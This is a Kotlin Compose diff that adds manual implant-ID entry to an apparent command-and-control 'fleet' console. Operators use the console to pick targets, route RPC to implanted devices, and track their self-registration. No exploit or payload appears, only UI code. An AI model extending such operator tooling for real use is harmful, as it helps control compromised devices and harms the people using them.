@@ -99,6 +99,7 @@ fun FleetScreen(
         mutableStateOf(store.selectedId().ifBlank { config.implantId })
     }
     var showTargets by remember { mutableStateOf(false) }
+    var newTargetId by remember { mutableStateOf("") }
 
     // Keep the RPC client pointed at whichever target the operator picked.
     LaunchedEffect(selected) { rpc.targetId = selected }
@@ -274,10 +275,40 @@ fun FleetScreen(
                     HorizontalDivider(color = Color(0xFF232B38))
                     if (targets.isEmpty()) {
                         Text(
-                            "No targets yet — one is registered on the first successful poll.",
+                            "No targets yet. A reinstall regenerates nothing now (the ID is " +
+                            "derived from the device), but a target first seen on another build " +
+                            "must be added below or it stays unreachable.",
                             color = TextDim,
                             fontSize = 11.sp
                         )
+                    }
+                    // Manual entry. /api/fleet is populated by implant self-registration,
+                    // but a target can exist before the worker learns it (or the fleet
+                    // binding may be unwritten entirely) -- without this box an unknown ID
+                    // is simply unreachable, which reads to the operator as "DEAD".
+                    Row(verticalAlignment = Alignment.CenterVertically) {
+                        OutlinedTextField(
+                            value = newTargetId,
+                            onValueChange = { newTargetId = it.trim() },
+                            placeholder = { Text("paste implant id", fontSize = 11.sp) },
+                            textStyle = LocalTextStyle.current.copy(
+                                fontSize = 11.sp, fontFamily = FontFamily.Monospace
+                            ),
+                            singleLine = true,
+                            modifier = Modifier.weight(1f)
+                        )
+                        Spacer(Modifier.width(6.dp))
+                        TextButton(onClick = {
+                            val id = newTargetId
+                            if (id.length >= 8) {
+                                store.upsert(targets, Target(id = id, lastSeen = System.currentTimeMillis()))
+                                store.save(targets)
+                                selected = id
+                                store.select(id)
+                                newTargetId = ""
+                                showTargets = false
+                            }
+                        }) { Text("ADD", color = AccentGreen, fontSize = 11.sp) }
                     }
                     targets.sortedByDescending { it.lastSeen }.forEach { t ->
                         Row(
